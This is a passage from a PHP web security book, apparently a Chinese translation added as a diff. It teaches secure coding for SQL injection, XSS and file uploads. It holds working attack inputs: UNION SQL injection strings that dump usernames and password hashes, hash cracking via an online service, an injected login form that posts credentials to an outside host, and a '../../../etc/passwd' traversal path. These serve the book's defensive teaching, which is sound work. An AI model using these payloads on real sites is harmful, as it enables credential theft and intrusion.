@@ -1,0 +1,264 @@
+
+我们应该得到图 22.11 和图 22.12 所示的输出。这里有很多有趣的信息可以挖掘。然而，我特别感兴趣的是`SQLInjection`数据库中的`Login`表。`information_schema`数据库的`columns`表中的`COLUMN_NAME`字段将列出我感兴趣的任何表的全部字段。字段包含在`COLUMN_NAME`字段中。
+
+让我们在搜索字段中输入以下内容以了解`Login`表中有哪些字段：
+
+```
+sir%' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'Login');--
+```
+
+我们得到这个（图 22.13）。`UserName`、`HashedPassword`和`Access`看起来很有希望！
+
+我现在知道了想要查询的数据库、表和列。让我们看看是否能获取一些用户名和密码！在搜索字段中输入以下内容：
+
+```
+sir%' UNION (SELECT UserName, HashedPassword, Access FROM Login);--
+```
+
+这给我们图 22.14 中的信息。我特别感兴趣的是具有管理员访问权限的用户，看起来哈希可能没有加盐（糟糕）！事实上，当我通过 https://crackstation.net 运行哈希时，我得到图 22.15（下一页）。
+
+说真的，这非常可怕。平均而言（逐年），20% 到 30% 的网站容易受到 SQL 注入攻击。
+
+> https://edgescan.com 每年都会发布一份漏洞报告，详细说明已发现的漏洞统计数据。以下是他们 2020 年报告的链接[6]。
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_330_0.png)
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_330_1.png)
+
+[6] 2020 report: http://phpa.me/edgescan-2020
+
+## 22. 创建安全 Web 应用
+
+使用`mysql_real_escape_string()`的问题在于它在没有底层 SQL 查询使用该输入的上下文的情况下转义表单字段输入。有时它会失败的原因相当技术性。然而，请查看 http://phpa.me/so-sqli-edgecase 以了解一个导致清理失败的边缘情况。
+
+### 预处理语句
+
+预处理语句是对 SQL 注入的更好防护。缓解 SQL 注入的更稳健方法是使用预处理语句，也称为参数化查询。`mysql_real_escape_string()`的问题在于它没有将你的输入与查询本身分离，而是实际上将其插入到查询中。然而，预处理语句会将数据库输入与查询分离，并且不允许你插入 SQL 命令（如子查询）。让我们看看预处理语句以及如何使用它们。
+
+PHP 语言通过`mysqli`扩展提供了两个用于参数化数据库输入的函数：`mysqli_prepare()`和`mysqli_stmt_bind_param()`。我们可以一起使用这些函数来参数化数据库查询。`mysqli_prepare()`用于将 SQL 查询参数化为语句，该语句将使用`mysqli_stmt_bind_param()`函数绑定到输入参数。
+
+清单 22.2 展示了如何使用这些函数。
+
+```php
+<?php
+$dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
+or trigger_error(
+'Error connecting to MySQL server for' . DB_NAME,
+E_USER_ERROR
+);
+
+$search_term = isset($_POST['search']) ? $_POST['search'] : '';
+
+$sql = "SELECT some_field_1, some_field_2, some_field_3 "
+. " FROM Sometable WHERE some_field_n LIKE ?";
+
+$stmt = mysqli_prepare($dbc, $sql);
+
+$search_term = '%' . $search_term . '%';
+
+mysqli_stmt_bind_param($stmt, 's', $search_term);
+```
+
+> [8] `mysqli_prepare()`: https://php.net/mysqli_prepare
+
+> [9] `mysqli_stmt_bind_param()`: https://php.net/mysqli_stmt_bind_param
+
+> [10] `mysqli_stmt_bind_param()`: https://php.net/mysqli_stmt_bind_param
+
+### 向黑客泄露信息
+
+用安全术语来说，了解你编写的任何应用程序的攻击向量至关重要。这些通常是通过`POST`发送的 cookie、查询参数和表单字段。对于 Web 应用程序而言。另一个需要考虑的问题是我们公开了哪些信息——例如数据库模式或文件系统路径——黑客可以利用这些信息渗透我们的应用程序。这些恰好与攻击向量密切相关。让我们逐一查看这些。
+
+#### Cookie
+
+Web 应用程序可以使用 cookie 存储各种信息。然而，它们驻留在客户端浏览器上，因此可以被查看并且容易被修改。我可以花大量时间讨论什么应该存储在 cookie 中，什么不应该存储（例如，你绝不应在 cookie 中存储个人信息）。然而，这个争论是多余的；除了数据库之外，使用会话变量，并且只使用一个 cookie 来存储会话 ID。这样做可以避免使用 cookie 时的大多数问题。请记住，cookie 只是解决 Web 无状态问题的解决方案之一。我们有更好的工具可用于解决持久性问题：数据库和会话变量。
+
+#### 查询参数
+
+查询参数在`HTTP GET`请求的 URL 中发送，在`?`之后：
+
+```
+http://example.com?term=elephant&page=3
+```
+
+用户或潜在黑客可以看到这一点。查询参数可以用作持久性机制（类似于表单中的隐藏变量）。这种做法会暴露有关应用程序及其运行方式的细节。通常我们只需要发送一个查询参数，它可以是一个 ID，该 ID 映射到数据库表中的主键，在处理 GET 请求后可以在脚本中查询该主键。
+
+```
+http://example.com?id=840938
+```
+
+由于查询参数是用户提供的数据，在查询中使用时应对其进行参数化，并在`HTML`中显示时进行转义。
+
+#### 表单字段
+
+对于试图猜测数据库模式中字段名称的黑客来说，表单字段是信息的金矿。不幸的是，这一直是开发人员的常见做法，使得在盲 SQL 注入攻击中猜测数据库模式的过程变得容易得多。
+
+我住在一个保险公司众多的地区，它们通常对用于表单字段的数据库表中的列名进行混淆有开发要求。这是一个每个开发人员都应遵循的优秀实践。
+
+### 防止跨站脚本攻击
+
+跨站脚本 (XSS) 被列为“OWASP Top Ten”中的第七号 ASR。根据 OWASP：
+
+> XSS 缺陷每当应用程序在未经适当验证或转义的情况下将不可信数据包含在新的网页中，或使用可以创建 HTML 或 JavaScript 的浏览器 API 用用户提供的数据更新现有网页时就会发生。XSS 允许攻击者在受害者的浏览器中执行脚本，从而劫持用户会话、破坏网站或将用户重定向到恶意网站。
+
+听起来很可怕！好吧，所有这些东西都很可怕。针对浏览器的 XSS 攻击有三种向量：反射型 XSS、存储型 XSS 和 DOM XSS：
+
+OWASP 对此的说法如下：
+
+- **Reflected XSS:** 应用程序或 API 将未经验证和未转义的用户输入作为 HTML 输出的一部分包含在内。成功的攻击可能允许攻击者在受害者的浏览器中执行任意 HTML 和 JavaScript。通常，用户需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意钓鱼网站、广告或类似内容。
+
+- **Stored XSS:** 应用程序或 API 存储未清理的用户输入，该输入稍后会被另一用户或管理员查看。存储型 XSS 通常被认为属于高风险或关键风险。
+
+- **DOM XSS:** JavaScript 框架、单页应用程序以及动态将攻击者可控数据包含到页面中的 API 容易受到 DOM XSS 的影响。理想情况下，应用程序不应向不安全的 JavaScript API 发送攻击者可控数据。
+
+我将处理前两种，因为缓解第三种类型的攻击是在`PHP`之外完成的。
+
+XSS 的工作原理相当复杂，因为涉及的参与者众多。*PHP 应用的安全原则* 由 Eric Mann 所著，是更深入讨论的优秀参考资料。在第 7 章中，Eric 解释了 XSS 及其预防方法。另一个很好的参考资料是 https://excess-xss.com。作者提供了一份全面的教程，其中包含图表，解释 XSS 和缓解策略。
+
+XSS 的核心涉及三个参与者：攻击者、受害者和易受攻击的网站。为了缓解漏洞，我们的代码必须在输出之前对网站的所有输入进行清理，去除 JavaScript 和 HTML 实体。
+
+#### 反射型 XSS
+
+让我们以上面编写的用于测试 SQL 注入攻击的应用程序为例，并在网页上添加搜索词的输出，如图 22.16 所示。
+
+即使我们已将搜索词输入参数化到数据库查询中，让我们看看这个 Web 应用程序是否容易受到反射型 XSS 攻击的利用。如果我们能够执行 JavaScript 命令或渲染一些额外的 HTML，就说明它可以被利用。
+
+```
+<script>alert('XSS Attack')</script>
+```
+
+让我们首先按图 22.17 所示将`<script>alert('XSS Attack')</script>`输入到搜索字段中。我们得到图 22.18 所示的结果。糟糕！不幸的是，这表明我们的应用程序容易受到 XSS 攻击。
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_336_0.png)
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_336_1.png)
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_336_2.png)
+
+让我们再做一个测试，看看是否可以渲染以下 HTML 表单：
+
+```
+<h4>Clickbait Login</h4>
+<form action=http://iwantyourcredentials.info method=POST>
+    Username:
+    <input type='text' name='username'><br/>
+    Password:
+    <input type='password' name='password'><br/>
+    <input type='submit' value='Submit'>
+</form>
+```
+
+当我们在图 22.19 中将 HTML 输入到搜索字段并按下提交时，我们得到图 22.20 中的结果。
+
+如果我填写此表单并提交它（图 22.21），我就会陷入困境！我们允许网络上的任何攻击者在我们的网站上托管表单。在这种情况下，他们可以利用它来窃取我们用户的凭据。
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_337_0.png)
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_337_1.png)
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_337_2.png)
+
+让我们看一下易受攻击代码的一部分：
+
+```
+$search_term = isset($_POST['search']) ? $_POST['search'] : '';
+?>
+<h2>Stuff you might be interested in as a result of searching for
+<span class="text-danger"><?= $search_term ?></span>...</h2>
+```
+
+我们没有对搜索字段的输入进行清理，去除 HTML 实体，如`<`、`>`、`"`和其他特殊符号。因此，我们允许 HTML 标记和 JavaScript 代码执行。
+
+幸运的是，解决方案很简单，只需使用函数`filter_var()`[^13]。由于我们期望搜索词为字符串，可以这样对应用程序进行 XSS 清理：
+
+```php
+$search_term = isset($_POST['search']) ? $_POST['search'] : '';
+
+$search_term = filter_var($search_term, FILTER_SANITIZE_STRING);
+
+?>
+
+<h2>Stuff you might be interested in as a result of searching for
+
+<span class="text-danger"><?= $search_term?></span>...</h2>
+```
+
+现在当我们在搜索字段中输入`<script>alert('XSS Attack')</script>`时，不再会弹出`alert()`，而是得到你在图 22.22 中看到的输出。当我们将表单输入到搜索字段时，也不再会得到登录表单，而是得到图 22.23 中显示的内容。
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_338_0.png)
+
+![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_338_1.png)
+
+请注意，如果你接收到的是电子邮件地址作为输入，应使用`FILTER_SANITIZE_EMAIL`，因为它会删除电子邮件地址中不允许的所有字符。有关清理过滤器列表的更多信息，请参阅 https://php.net/filter.filters.sanitize。
+
+> > 你可能会看到旧文章使用函数`htmlentities()`[^14]和`htmlspecialchars()`来防御 XSS。虽然它们可能有效，但不能防止目录遍历攻击。此外，默认参数并不能保护你免受所有 XSS 攻击。
+
+#### 存储型 XSS
+
+关于存储型 XSS，你应该非常谨慎，并确保对从数据库查询出来并计划在网页上显示的所有内容都运行`filter_var()`函数。如果输出发送到 CSV 文件、PDF 文档或其他格式，可能需要以不同的方式转义。
+
+你应该将这种方法与验证和清理进入 Web 应用程序的所有内容相结合。这意味着使用`filter_var()`过滤表单或查询参数中的每个输入，然后对这些输入的所有查询也进行参数化。
+
+[13] `filter_var()`: https://php.net/filter_var
+
+[14] `htmlentities()`: https://php.net/htmlentities
+
+### 文件上传
+
+攻击的另一个来源是上传的文件。OWASP 提供了大量关于上传文件风险以及各种缓解策略的详细信息。我的建议始终是遵循 OWASP 的指导。尽管如此，以下是允许安全上传文件时必须考虑的最小事项。
+
+对于本示例，假设我们要求用户使用以下表单上传图像文件：
+
+```
+<form method="POST" enctype="multipart/form-data" action="upload.php">
+    File: <input type="file" name="picture">
+    <input type="submit" value="Submit">
+</form>
+```
+
+#### 验证上传的文件
+
+验证上传文件需要遵循几个步骤。例如，你需要防范目录路径遍历攻击，仅接受通过`POST`上传的文件，检查文件类型并检查文件大小。
+
+#### 防范路径遍历攻击
+
+攻击者可以通过将文件名设置为相对路径（例如`../../../etc/passwd`）来尝试从 Web 服务器获取密码或访问本不打算访问的文件。
+
+为了防范此攻击，使用`basename()`[15]函数剥离不需要的字符：
+
+```
+$file_name = basename($_FILES['picture']['name']);
+```
+
+#### 仅接受通过 HTTP POST 上传的文件
+
+作为防止操纵 Web 应用程序处理不应处理的文件的延伸，你应该使用`is_uploaded_file()`[16]函数验证文件是否确实通过 HTTP POST 上传：
+
+```
+if (is_uploaded_file($_FILES['picture']['tmp_name']) === true)
+{
+    // You're good to go!
+}
+else
+{
+    // We've got a problem!
+}
+```
+
+[15] `basename()`: https://php.net/basename
+
+[16] `is_uploaded_file()`: https://php.net/is_uploaded_file
+
+#### 检查 MIME 文件类型
+
+我们还希望防止攻击者上传应用程序不感兴趣的文件（例如可执行文件）。与其依赖`$_FILES['picture']['type']`中包含的文件扩展名，最好使用`finfo_open()`[17]和`finfo_file()`[18]函数来检查实际文件的 MIME 文件类型：
+
+```
+$file_info = finfo_open(FILEINFO_MIME_TYPE);
+$file_mime_type = finfo_file($file_info, $_FILES['picture']['tmp_name']);
+finfo_close($file_info);
+```
+
+如果你期望的是图像类型，除了显式验证 MIME 文件类型外，还应使用`getimagesize()`[19]函数，如清单 22.4 所示
+
+#### 清单 22.4.
